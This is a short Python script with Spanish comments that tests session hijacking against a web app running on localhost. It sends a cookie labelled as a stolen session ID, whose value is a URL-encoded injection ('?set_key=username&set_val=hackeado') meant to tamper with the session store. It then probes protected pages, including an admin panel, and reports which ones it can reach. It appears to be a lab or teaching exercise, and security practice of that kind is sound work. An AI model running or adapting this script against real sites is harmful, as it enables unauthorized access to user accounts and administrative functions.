import requests

# Copia el session ID que ves en la página vulnerable
session_id = "%3Fset_key%3Dusername%26set_val%3Dhackeado"

cookies = {"sessionid": session_id}

# Intenta acceder a páginas protegidas con la sesión robada
paginas = [
    "http://127.0.0.1:8000/tienda/",
    "http://127.0.0.1:8000/main/",
    "http://127.0.0.1:8000/admin-panel/",
]

for url in paginas:
    r = requests.get(url, cookies=cookies, allow_redirects=False)
    if r.status_code == 200:
        print(f"✅ Acceso obtenido: {url}")
    elif r.status_code == 302:
        print(f"↩️  Redirige a: {r.headers.get('Location')} — {url}")
    else:
        print(f"❌ Sin acceso ({r.status_code}): {url}")